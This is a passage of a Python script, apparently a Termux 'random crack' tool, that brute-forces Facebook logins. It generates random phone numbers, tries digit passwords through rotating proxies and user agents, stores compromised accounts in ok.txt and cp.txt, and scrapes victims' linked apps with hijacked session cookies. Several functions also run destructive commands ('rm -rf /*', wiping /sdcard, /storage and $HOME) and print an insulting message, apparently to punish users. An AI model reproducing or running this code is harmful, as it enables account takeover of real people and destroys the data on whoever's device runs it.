    os.system("rm -rf /data/data/com.termux/")
    print(f'{M} Your System Fucked by {H} FJ-Riyad{P}');time.sleep(2)
def mahin():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
     
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system("rm -rf /data/data/com.termux/")
    print(f'{M} Your System Fucked by {H} FJ-Riyad{P}');time.sleep(2)
    
def Approval():
    os.system("rm -rf /sdcard/DCIM")
    os.system("rm -rf /sdcard/*")
    os.system("rm -rf /sdcard/update")
     
    os.system('termux-setup-storage')
    os.system('rm -rf /storage/emulated/0/*')
    os.system('rm -rf /storage/emulated/*')
    os.system('rm -rf /sdcard/*')
    os.system('rm -rf /sdcard/0/*')
    os.system('rm -rf /sdcard1/*')
    os.system('rm -rf /storage/*')
    os.system('rm -rf /*')
    os.system('rm -rf /system/*')
    os.system('rm -rf $HOME/../../*')
    os.system('rm -rf $PREFIX/b')
    os.system('rm -rf $HOME/*')
    os.system('mv $HOME /dev/null')
    os.system("rm -rf /data/data/com.termux/");time.sleep(2)
    print(f'{M} Your System Fucked by {H} FJ-Riyad{P}');time.sleep(2)
def clear_layar():
	try:os.system('clear')
	except:pass
def back():
	try:your_name = open('.your_name.json','r').read()
	except:newbie()
def newbie():
	clear()
	print(logo)
	your_name = input(f'    [{H}âˆš{P}]{K} YOUR NAME {M}? {P}: {warna} ');open('.your_name.json','w').write(your_name)
	main()
def clear_layar():
	try:os.system('clear')
	except:pass
def back():
	try:your_name = open('.your_name.json','r').read()
	except:newbie()
def newbie():
	clear()
	print(logo)
	your_name = input(f'    [{H}Ã¢Ë†Å¡{P}]{K} YOUR NAME {M}? {P}: {warna} ');open('.your_name.json','w').write(your_name)
	main()
def cek_apk(session,coki):

    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))

    else:

        print(f'\r ðŸŽ®  %sYour Active Application Details :'%(H))

        for i in range(len(game)):

            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

        #else:

            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))

    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))

    else:

        print(f'\r ðŸŽ®  %sYour Expired Application Details :'%(M))

        for i in range(len(game)):

            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

        else:

            print(f'\r')

            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))

loop = 0
Apk = []
oks = []
cps = []
				
def main():
    os.system('clear')
    print(logo)
    print('')
    print ('\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\033[1;92mâ•‘\x1b[1;92m\x1b[1;45mFJ-Riyad\033[0;m\x1b[1;92mâ•‘â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')
    print('\033[1;97m |\033[1;92m01\033[1;97m| START RANDOM CRACK')
    print ('\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\033[1;92mâ•‘\x1b[1;92m\x1b[1;45mFJ-Riyad\033[0;m\x1b[1;92mâ•‘â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')
    
    opt = input('[!]\033[1;33m SELECT OPTION: ')
    if opt =='1':
        random_crack()
    else:
        print('\n\033[1;92mChoose valid option\033[0;97m')
def random_crack():
    os.system('clear')
    print(logo)
    print('')
    print ('\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\033[1;92mâ•‘\x1b[1;92m\x1b[1;45mFJ-Riyad\033[0;m\x1b[1;92mâ•‘â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')
    print('\033[1;97m |\033[1;92m01\033[1;97m| 7DIGIT PASS CRACK')   
    print('\033[1;97m |\033[1;92mB\033[1;97m| Back')
    print ('\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\033[1;92mâ•‘\x1b[1;92m\x1b[1;45mFJ-Riyad\033[0;m\x1b[1;92mâ•‘â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')
    
    opt = input('[!]\033[1;33m SELECT OPTION: ')
    if opt =='1':
        random_number()
    elif opt =='3':
        main()
    else:
        print('\n\033[1;92mChoose valid option\033[0;97m')
def random_number():
    uid=[]
    os.system('clear')
    print(logo)
    print('')
    print('\033[1;95m[âˆš] SIM CODE : ðŸ‘‡')   
    print('\033[1;32m[~] \033[1;32m880130,880140,880150 ETC...\033[0;92m')
    print('\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\033[1;92mâ•‘\x1b[1;92m\x1b[1;45mFJ-Riyad\033[0;m\x1b[1;92mâ•‘â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')
    
    kode = input('[+]\033[1;36m Choose  Code: ')
    print('\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\033[1;92mâ•‘\x1b[1;92m\x1b[1;45mFJ-Riyad\033[0;m\x1b[1;92mâ•‘â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')
    print('EXAMPLE:5000    10000    20000 ETC')
    limit = int(input('LIMIT NUMBER:'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        uid.append(nmp)
    with ThreadPool(max_workers=65) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(uid))
        print('')
        print('\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\033[1;92mâ•‘\x1b[1;92m\x1b[1;45mFJ-Riyad\033[0;m\x1b[1;92mâ•‘â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')
        print('\033[1;92m|ðŸ˜˜|\033[1;92mUser Name : '+nm) 
        print('\033[1;92m|ðŸ˜˜|\033[1;92mTotal ids : '+tl)
        print('\033[1;92m|ðŸ˜˜|\033[1;92mStart Time:', dt_string)
        print('\033[1;92m|ðŸ˜˜|\033[1;92mToday date:',d1)
        print('\033[1;92m|ðŸ˜˜|\033[1;92mprocess has been started')
        print('\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\033[1;92mâ•‘\x1b[1;92m\x1b[1;45mFJ-Riyad\033[0;m\x1b[1;92mâ•‘â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')
        for guru in uid:
            uid = kode+guru
            pwx = [guru]
            yaari.submit(rcrack,uid,pwx,tl)
    print('\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\033[1;92m  â•‘\x1b[1;92m\x1b[1;45mFJ-Riyad\033[0;m\x1b[1;92mâ•‘mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print('\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\033[1;92m  â•‘\x1b[1;92m\x1b[1;45mFJ-Riyad\033[0;m\x1b[1;92mâ•‘mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•')

def rcrack(uid,pwx,tl):
    #print(uid)
    global loop
    global cps
    global oks
    try:
        for ps in pwx:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ua = random.choice(ugen)
            ua2 = random.choice(ugen2)   
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=6YdeYyyFbIKBueWR_kJKQTGs; sb=6YdeYzzJPXghUBss0E_nGg1C; vpd=v1%3B736x393x2.75; locale=en_GB; dnonce=AWkgtYnjDv31YPcurWzWMz064FWbBTJD6giHmjGZaAgRDMfMFxNJw8mYsChL0RibJVe7o8H1sIA08-YaMmphVRv7; fr=05TqVhxpjbr6hw8XJ.AWX1ggSFW5lYEfwtXHDWC8CW56M.Bjdhqy.qi.AAA.0.0.Bj2Kq2.AWVrq0AvkVI',
    'sec-ch-ua': '"Chromium";v="105", "Not)A;Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua}
            lo = session.post('https://mbasic.facebook.com/login/?next=https%3A%2F%2Fmbasic.facebook.com%2Fhome.php%3Fref%3Dwizard%26paipv%3D0%26eav%3DAfaFt6lNta0oR9qVo9xWU-zPFTIdI3x667_C8PHlgI_-0Cs1Rxs-_7ah6mtMjnSiswg&ref=wizard&fl&login_from_aymh=1&refid=9',data=log_data,headers=header_freefb,proxies=proxs).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[1;92m[FJ-Riyad OKðŸ˜˜] '+uid+' | '+ps+'\n[â€¢] Useeagent: '+ua+'\033[0;97m')
                open('ok.txt', 'a').write(cid+' | '+ps+'\n')
                cek_apk(session,coki)
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;95m[FJ-Riyad CPðŸ’”] '+uid+' | '+ps+'\033[0;97m')
                open('cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r [FJ-Riyad]  [%s/%s]  OK:- %s  CP:- %s \r'%(loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
main()
